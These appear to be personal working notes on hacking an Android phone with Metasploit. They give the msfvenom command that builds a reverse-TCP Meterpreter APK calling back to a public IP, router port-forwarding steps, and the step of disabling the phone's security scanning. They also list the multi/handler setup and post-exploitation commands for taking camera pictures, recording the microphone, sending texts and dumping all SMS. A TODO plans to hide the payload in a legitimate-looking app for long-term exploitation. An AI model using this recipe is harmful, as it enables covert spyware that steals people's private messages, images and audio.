SO FAR:

-downloaded a couple apks
	-snapchat - seemed wrong - very large, lots of conflicting plugins
	-discord - a little better
		-BOTH ARE UNSTABLE AND CRASH
		-should possibly move on to much simpler apk
-download and setup metasploit, a penetration testing software
	-download zipalign, jarsigner, apktool, keytool
	-set on OS PATH variable

-these are the best starting points

 https://hackingworld.in/hack-android-phone-metasploit/

-created payloads using msfvenom.bat
	-msfvenom.bat -p android/meterpreter/reverse_tcp LHOST=74.110.147.124 LPORT=4444 R > hackingworld5.apk
		-LHOST is public IP address
		-set up port forward 4444 to local ip address 192.168.1.230 in verizon router settings at 192.168.1.1

-had to change settings on target device
	-allow installation of apks (enable developer options)
	-disable Verizon Security and Privacy from scanning incoming apk installations, as this was blocking the payload apk

-set up port forwarding
	-set up port forward 4444 to local ip address 192.168.1.230 in verizon router settings at 192.168.1.1
	-this forwards requests to public IP 74.110.147.124 port 4444 to local ip 192.168.1.230
	-exploit can be run through internet now, much more powerful

-setup meterpreter in msfconsole
	-msfconsole.bat
	-msf > use multi/handler
	-msf (multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
	-msf (multi/handler) > set LHOST 192.168.1.230
	-msf (multi/handler) > set LPORT 4444
	-msf (multi/handler) > exploit

-current working payload is hackingworld5.apk in the metasploit bin folder
	-webcam_snap -i 2	(takes front cam pic, -i 1 takes back cam pic)
	-webcam_stream
	-record_mic -d 20	(records from mic for 10 seconds, not sure exactly what the number denotes)
	-send_sms -d "8043324262" -t "hello"	(sends the text "hello" to phone number 8043324262)
	-sms_dump	(saves all sms messagse as a text file)
	-many more commands to test

-TODO
	-mount to legitimate looking application
	-investigate static vs dynamic public IP address for long term exploitation
	-make presentation
